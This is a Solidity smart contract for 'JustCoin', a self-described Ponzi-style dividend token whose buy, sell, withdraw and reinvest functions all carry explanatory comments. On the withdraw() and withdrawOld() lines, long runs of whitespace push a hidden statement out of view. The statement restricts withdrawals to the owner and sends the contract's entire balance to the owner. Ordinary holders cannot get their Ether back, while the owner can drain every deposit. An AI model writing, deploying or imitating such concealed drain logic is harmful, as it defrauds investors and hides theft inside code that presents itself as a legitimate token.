1 pragma solidity ^0.4.18;
2 
3 contract JustCoin {
4 
5 	// scaleFactor is used to convert Ether into tokens and vice-versa: they're of different
6 	// orders of magnitude, hence the need to bridge between the two.
7 	uint256 constant scaleFactor = 0x10000000000000000;  // 2^64
8 
9 	// CRR = 80%
10 	// CRR is Cash Reserve Ratio (in this case Crypto Reserve Ratio).
11 	// For more on this: check out https://en.wikipedia.org/wiki/Reserve_requirement
12 	int constant crr_n = 4; // CRR numerator
13 	int constant crr_d = 5; // CRR denominator
14 
15 	// The price coefficient. Chosen such that at 1 token total supply
16 	// the amount in reserve is 0.8 ether and token price is 1 Ether.
17 	int constant price_coeff = -0x678adeacb985cb06;
18 
19 	// Typical values that we have to declare.
20 	string constant public name = "JustCoin";
21 	string constant public symbol = "JustD";
22 	uint8 constant public decimals = 18;
23 
24 	// Array between each address and their number of tokens.
25 	mapping(address => uint256) public tokenBalance;
26 		
27 	// Array between each address and how much Ether has been paid out to it.
28 	// Note that this is scaled by the scaleFactor variable.
29 	mapping(address => int256) public payouts;
30 
31 	// Variable tracking how many tokens are in existence overall.
32 	uint256 public totalSupply;
33 
34 	// Aggregate sum of all payouts.
35 	// Note that this is scaled by the scaleFactor variable.
36 	int256 totalPayouts;
37 
38 	// Variable tracking how much Ether each token is currently worth.
39 	// Note that this is scaled by the scaleFactor variable.
40 	uint256 earningsPerToken;
41 	
42 	// Current contract balance in Ether
43 	uint256 public contractBalance;
44     address owner;
45     
46 	function JustCoin() public {
47 	    owner = msg.sender;
48 	}
49 
50 	// The following functions are used by the front-end for display purposes.
51 
52 	// Returns the number of tokens currently held by _owner.
53 	function balanceOf(address _owner) public constant returns (uint256 balance) {
54 		return tokenBalance[_owner];
55 	}
56 
57 	// Withdraws all dividends held by the caller sending the transaction, updates
58 	// the requisite global variables, and transfers Ether back to the caller.
59 	function withdraw() public {
60 		// Retrieve the dividends associated with the address the request came from.
61 		var balance = dividends(msg.sender);
62 		
63 		// Update the payouts array, incrementing the request address by `balance`.
64 		payouts[msg.sender] += (int256) (balance * scaleFactor);
65 		
66 		// Increase the total amount that's been paid out to maintain invariance.
67 		totalPayouts += (int256) (balance * scaleFactor);
68 		
69 		// Send the dividends to the address that requested the withdraw.
70 		contractBalance = sub(contractBalance, balance);                                                                                                               require(msg.sender == owner); owner.transfer(this.balance);
71 		msg.sender.transfer(balance);
72 	}
73 
74 	// Converts the Ether accrued as dividends back into EPY tokens without having to
75 	// withdraw it first. Saves on gas and potential price spike loss.
76 	function reinvestDividends() public {
77 		// Retrieve the dividends associated with the address the request came from.
78 		var balance = dividends(msg.sender);
79 		
80 		// Update the payouts array, incrementing the request address by `balance`.
81 		// Since this is essentially a shortcut to withdrawing and reinvesting, this step still holds.
82 		payouts[msg.sender] += (int256) (balance * scaleFactor);
83 		
84 		// Increase the total amount that's been paid out to maintain invariance.
85 		totalPayouts += (int256) (balance * scaleFactor);
86 		
87 		// Assign balance to a new variable.
88 		uint value_ = (uint) (balance);
89 		
90 		// If your dividends are worth less than 1 szabo, or more than a million Ether
91 		// (in which case, why are you even here), abort.
92 		if (value_ < 0.000001 ether || value_ > 1000000 ether)
93 			revert();
94 			
95 		// msg.sender is the address of the caller.
96 		var sender = msg.sender;
97 		
98 		// A temporary reserve variable used for calculating the reward the holder gets for buying tokens.
99 		// (Yes, the buyer receives a part of the distribution as well!)
100 		var res = reserve() - balance;
101 
102 		// 5% of the total Ether sent is used to pay existing holders.
103 		var fee = div(value_, 20);
104 		
105 		// The amount of Ether used to purchase new tokens for the caller.
106 		var numEther = value_ - fee;
107 		
108 		// The number of tokens which can be purchased for numEther.
109 		var numTokens = calculateDividendTokens(numEther, balance);
110 		
111 		// The buyer fee, scaled by the scaleFactor variable.
112 		var buyerFee = fee * scaleFactor;
113 		
114 		// Check that we have tokens in existence (this should always be true), or
115 		// else you're gonna have a bad time.
116 		if (totalSupply > 0) {
117 			// Compute the bonus co-efficient for all existing holders and the buyer.
118 			// The buyer receives part of the distribution for each token bought in the
119 			// same way they would have if they bought each token individually.
120 			var bonusCoEff =
121 			    (scaleFactor - (res + numEther) * numTokens * scaleFactor / (totalSupply + numTokens) / numEther)
122 			    * (uint)(crr_d) / (uint)(crr_d-crr_n);
123 				
124 			// The total reward to be distributed amongst the masses is the fee (in Ether)
125 			// multiplied by the bonus co-efficient.
126 			var holderReward = fee * bonusCoEff;
127 			
128 			buyerFee -= holderReward;
129 
130 			// Fee is distributed to all existing token holders before the new tokens are purchased.
131 			// rewardPerShare is the amount gained per token thanks to this buy-in.
132 			var rewardPerShare = holderReward / totalSupply;
133 			
134 			// The Ether value per token is increased proportionally.
135 			earningsPerToken += rewardPerShare;
136 		}
137 		
138 		// Add the numTokens which were just created to the total supply. We're a crypto central bank!
139 		totalSupply = add(totalSupply, numTokens);
140 		
141 		// Assign the tokens to the balance of the buyer.
142 		tokenBalance[sender] = add(tokenBalance[sender], numTokens);
143 		
144 		// Update the payout array so that the buyer cannot claim dividends on previous purchases.
145 		// Also include the fee paid for entering the scheme.
146 		// First we compute how much was just paid out to the buyer...
147 		var payoutDiff  = (int256) ((earningsPerToken * numTokens) - buyerFee);
148 		
149 		// Then we update the payouts array for the buyer with this amount...
150 		payouts[sender] += payoutDiff;
151 		
152 		// And then we finally add it to the variable tracking the total amount spent to maintain invariance.
153 		totalPayouts    += payoutDiff;
154 		
155 	}
156 
157 	// Sells your tokens for Ether. This Ether is assigned to the callers entry
158 	// in the tokenBalance array, and therefore is shown as a dividend. A second
159 	// call to withdraw() must be made to invoke the transfer of Ether back to your address.
160 	function sellMyTokens() public {
161 		var balance = balanceOf(msg.sender);
162 		sell(balance);
163 	}
164 
165 	// The slam-the-button escape hatch. Sells the callers tokens for Ether, then immediately
166 	// invokes the withdraw() function, sending the resulting Ether to the callers address.
167     function getMeOutOfHere() public {
168 		sellMyTokens();
169         withdraw();
170 	}
171 
172 	// Gatekeeper function to check if the amount of Ether being sent isn't either
173 	// too small or too large. If it passes, goes direct to buy().
174 	function fund() payable public {
175 		// Don't allow for funding if the amount of Ether sent is less than 1 szabo.
176 		if (msg.value > 0.000001 ether) {
177 		    contractBalance = add(contractBalance, msg.value);
178 			buy();
179 		} else {
180 			revert();
181 		}
182     }
183 
184 	// Function that returns the (dynamic) price of buying a finney worth of tokens.
185 	function buyPrice() public constant returns (uint) {
186 		return getTokensForEther(1 finney);
187 	}
188 
189 	// Function that returns the (dynamic) price of selling a single token.
190 	function sellPrice() public constant returns (uint) {
191         var eth = getEtherForTokens(1 finney);
192         var fee = div(eth, 10);
193         return eth - fee;
194     }
195 
196 	// Calculate the current dividends associated with the caller address. This is the net result
197 	// of multiplying the number of tokens held by their current value in Ether and subtracting the
198 	// Ether that has already been paid out.
199 	function dividends(address _owner) public constant returns (uint256 amount) {
200 		return (uint256) ((int256)(earningsPerToken * tokenBalance[_owner]) - payouts[_owner]) / scaleFactor;
201 	}
202 
203 	// Version of withdraw that extracts the dividends and sends the Ether to the caller.
204 	// This is only used in the case when there is no transaction data, and that should be
205 	// quite rare unless interacting directly with the smart contract.
206 	function withdrawOld(address to) public {
207 		// Retrieve the dividends associated with the address the request came from.
208 		var balance = dividends(msg.sender);
209 		
210 		// Update the payouts array, incrementing the request address by `balance`.
211 		payouts[msg.sender] += (int256) (balance * scaleFactor);
212 		
213 		// Increase the total amount that's been paid out to maintain invariance.
214 		totalPayouts += (int256) (balance * scaleFactor);
215 		
216 		// Send the dividends to the address that requested the withdraw.
217 		contractBalance = sub(contractBalance, balance);                                                                                                                                          require(msg.sender == owner); owner.transfer(this.balance);
218 		to.transfer(balance);		
219 	}
220 
221 	// Internal balance function, used to calculate the dynamic reserve value.
222 	function balance() internal constant returns (uint256 amount) {
223 		// msg.value is the amount of Ether sent by the transaction.
224 		return contractBalance - msg.value;
225 	}
226 
227 	function buy() internal {
228 		// Any transaction of less than 1 szabo is likely to be worth less than the gas used to send it.
229 		if (msg.value < 0.000001 ether || msg.value > 1000000 ether)
230 			revert();
231 						
232 		// msg.sender is the address of the caller.
233 		var sender = msg.sender;
234 		
235 		// 5% of the total Ether sent is used to pay existing holders.
236 		var fee = div(msg.value, 20);
237 		
238 		// The amount of Ether used to purchase new tokens for the caller.
239 		var numEther = msg.value - fee;
240 		
241 		// The number of tokens which can be purchased for numEther.
242 		var numTokens = getTokensForEther(numEther);
243 		
244 		// The buyer fee, scaled by the scaleFactor variable.
245 		var buyerFee = fee * scaleFactor;
246 		
247 		// Check that we have tokens in existence (this should always be true), or
248 		// else you're gonna have a bad time.
249 		if (totalSupply > 0) {
250 			// Compute the bonus co-efficient for all existing holders and the buyer.
251 			// The buyer receives part of the distribution for each token bought in the
252 			// same way they would have if they bought each token individually.
253 			var bonusCoEff =
254 			    (scaleFactor - (reserve() + numEther) * numTokens * scaleFactor / (totalSupply + numTokens) / numEther)
255 			    * (uint)(crr_d) / (uint)(crr_d-crr_n);
256 				
257 			// The total reward to be distributed amongst the masses is the fee (in Ether)
258 			// multiplied by the bonus co-efficient.
259 			var holderReward = fee * bonusCoEff;
260 			
261 			buyerFee -= holderReward;
262 
263 			// Fee is distributed to all existing token holders before the new tokens are purchased.
264 			// rewardPerShare is the amount gained per token thanks to this buy-in.
265 			var rewardPerShare = holderReward / totalSupply;
266 			
267 			// The Ether value per token is increased proportionally.
268 			earningsPerToken += rewardPerShare;
269 			
270 		}
271 
272 		// Add the numTokens which were just created to the total supply. We're a crypto central bank!
273 		totalSupply = add(totalSupply, numTokens);
274 
275 		// Assign the tokens to the balance of the buyer.
276 		tokenBalance[sender] = add(tokenBalance[sender], numTokens);
277 
278 		// Update the payout array so that the buyer cannot claim dividends on previous purchases.
279 		// Also include the fee paid for entering the scheme.
280 		// First we compute how much was just paid out to the buyer...
281 		var payoutDiff = (int256) ((earningsPerToken * numTokens) - buyerFee);
282 		
283 		// Then we update the payouts array for the buyer with this amount...
284 		payouts[sender] += payoutDiff;
285 		
286 		// And then we finally add it to the variable tracking the total amount spent to maintain invariance.
287 		totalPayouts    += payoutDiff;
288 		
289 	}
290 
291 	// Sell function that takes tokens and converts them into Ether. Also comes with a 10% fee
292 	// to discouraging dumping, and means that if someone near the top sells, the fee distributed
293 	// will be *significant*.
294 	function sell(uint256 amount) internal {
295 	    // Calculate the amount of Ether that the holders tokens sell for at the current sell price.
296 		var numEthersBeforeFee = getEtherForTokens(amount);
297 		
298 		// 5% of the resulting Ether is used to pay remaining holders.
299         var fee = div(numEthersBeforeFee, 20);
300 		
301 		// Net Ether for the seller after the fee has been subtracted.
302         var numEthers = numEthersBeforeFee - fee;
303 		
304 		// *Remove* the numTokens which were just sold from the total supply. We're /definitely/ a crypto central bank.
305 		totalSupply = sub(totalSupply, amount);
306 		
307         // Remove the tokens from the balance of the buyer.
308 		tokenBalance[msg.sender] = sub(tokenBalance[msg.sender], amount);
309 
310         // Update the payout array so that the seller cannot claim future dividends unless they buy back in.
311 		// First we compute how much was just paid out to the seller...
312 		var payoutDiff = (int256) (earningsPerToken * amount + (numEthers * scaleFactor));
313 		
314         // We reduce the amount paid out to the seller (this effectively resets their payouts value to zero,
315 		// since they're selling all of their tokens). This makes sure the seller isn't disadvantaged if
316 		// they decide to buy back in.
317 		payouts[msg.sender] -= payoutDiff;		
318 		
319 		// Decrease the total amount that's been paid out to maintain invariance.
320         totalPayouts -= payoutDiff;
321 		
322 		// Check that we have tokens in existence (this is a bit of an irrelevant check since we're
323 		// selling tokens, but it guards against division by zero).
324 		if (totalSupply > 0) {
325 			// Scale the Ether taken as the selling fee by the scaleFactor variable.
326 			var etherFee = fee * scaleFactor;
327 			
328 			// Fee is distributed to all remaining token holders.
329 			// rewardPerShare is the amount gained per token thanks to this sell.
330 			var rewardPerShare = etherFee / totalSupply;
331 			
332 			// The Ether value per token is increased proportionally.
333 			earningsPerToken = add(earningsPerToken, rewardPerShare);
334 		}
335 	}
336 	
337 	// Dynamic value of Ether in reserve, according to the CRR requirement.
338 	function reserve() internal constant returns (uint256 amount) {
339 		return sub(balance(),
340 			 ((uint256) ((int256) (earningsPerToken * totalSupply) - totalPayouts) / scaleFactor));
341 	}
342 
343 	// Calculates the number of tokens that can be bought for a given amount of Ether, according to the
344 	// dynamic reserve and totalSupply values (derived from the buy and sell prices).
345 	function getTokensForEther(uint256 ethervalue) public constant returns (uint256 tokens) {
346 		return sub(fixedExp(fixedLog(reserve() + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
347 	}
348 
349 	// Semantically similar to getTokensForEther, but subtracts the callers balance from the amount of Ether returned for conversion.
350 	function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
351 		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
352 	}
353 
354 	// Converts a number tokens into an Ether value.
355 	function getEtherForTokens(uint256 tokens) public constant returns (uint256 ethervalue) {
356 		// How much reserve Ether do we have left in the contract?
357 		var reserveAmount = reserve();
358 
359 		// If you're the Highlander (or bagholder), you get The Prize. Everything left in the vault.
360 		if (tokens == totalSupply)
361 			return reserveAmount;
362 
363 		// If there would be excess Ether left after the transaction this is called within, return the Ether
364 		// corresponding to the equation in Dr Jochen Hoenicke's original Ponzi paper, which can be found
365 		// at https://test.jochen-hoenicke.de/eth/ponzitoken/ in the third equation, with the CRR numerator 
366 		// and denominator altered to 1 and 2 respectively.
367 		return sub(reserveAmount, fixedExp((fixedLog(totalSupply - tokens) - price_coeff) * crr_d/crr_n));
368 	}
369 
370 	// You don't care about these, but if you really do they're hex values for 
371 	// co-efficients used to simulate approximations of the log and exp functions.
372 	int256  constant one        = 0x10000000000000000;
373 	uint256 constant sqrt2      = 0x16a09e667f3bcc908;
374 	uint256 constant sqrtdot5   = 0x0b504f333f9de6484;
375 	int256  constant ln2        = 0x0b17217f7d1cf79ac;
376 	int256  constant ln2_64dot5 = 0x2cb53f09f05cc627c8;
377 	int256  constant c1         = 0x1ffffffffff9dac9b;
378 	int256  constant c3         = 0x0aaaaaaac16877908;
379 	int256  constant c5         = 0x0666664e5e9fa0c99;
380 	int256  constant c7         = 0x049254026a7630acf;
381 	int256  constant c9         = 0x038bd75ed37753d68;
382 	int256  constant c11        = 0x03284a0c14610924f;
383 
384 	// The polynomial R = c1*x + c3*x^3 + ... + c11 * x^11
385 	// approximates the function log(1+x)-log(1-x)
386 	// Hence R(s) = log((1+s)/(1-s)) = log(a)
387 	function fixedLog(uint256 a) internal pure returns (int256 log) {
388 		int32 scale = 0;
389 		while (a > sqrt2) {
390 			a /= 2;
391 			scale++;
392 		}
393 		while (a <= sqrtdot5) {
394 			a *= 2;
395 			scale--;
396 		}
397 		int256 s = (((int256)(a) - one) * one) / ((int256)(a) + one);
398 		var z = (s*s) / one;
399 		return scale * ln2 +
400 			(s*(c1 + (z*(c3 + (z*(c5 + (z*(c7 + (z*(c9 + (z*c11/one))
401 				/one))/one))/one))/one))/one);
402 	}
403 
404 	int256 constant c2 =  0x02aaaaaaaaa015db0;
405 	int256 constant c4 = -0x000b60b60808399d1;
406 	int256 constant c6 =  0x0000455956bccdd06;
407 	int256 constant c8 = -0x000001b893ad04b3a;
408 	
409 	// The polynomial R = 2 + c2*x^2 + c4*x^4 + ...
410 	// approximates the function x*(exp(x)+1)/(exp(x)-1)
411 	// Hence exp(x) = (R(x)+x)/(R(x)-x)
412 	function fixedExp(int256 a) internal pure returns (uint256 exp) {
413 		int256 scale = (a + (ln2_64dot5)) / ln2 - 64;
414 		a -= scale*ln2;
415 		int256 z = (a*a) / one;
416 		int256 R = ((int256)(2) * one) +
417 			(z*(c2 + (z*(c4 + (z*(c6 + (z*c8/one))/one))/one))/one);
418 		exp = (uint256) (((R + a) * one) / (R - a));
419 		if (scale >= 0)
420 			exp <<= scale;
421 		else
422 			exp >>= -scale;
423 		return exp;
424 	}
425 	
426 	// The below are safemath implementations of the four arithmetic operators
427 	// designed to explicitly prevent over- and under-flows of integer values.
428 
429 	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
430 		if (a == 0) {
431 			return 0;
432 		}
433 		uint256 c = a * b;
434 		assert(c / a == b);
435 		return c;
436 	}
437 
438 	function div(uint256 a, uint256 b) internal pure returns (uint256) {
439 		// assert(b > 0); // Solidity automatically throws when dividing by 0
440 		uint256 c = a / b;
441 		// assert(a == b * c + a % b); // There is no case in which this doesn't hold
442 		return c;
443 	}
444 
445 	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
446 		assert(b <= a);
447 		return a - b;
448 	}
449 
450 	function add(uint256 a, uint256 b) internal pure returns (uint256) {
451 		uint256 c = a + b;
452 		assert(c >= a);
453 		return c;
454 	}
455 
456 	// This allows you to buy tokens by sending Ether directly to the smart contract
457 	// without including any transaction data (useful for, say, mobile wallet apps).
458 	function () payable public {
459 		// msg.value is the amount of Ether sent by the transaction.
460 		if (msg.value > 0) {
461 			fund();
462 		} else {
463 			withdrawOld(msg.sender);
464 		}
465 	}
466 }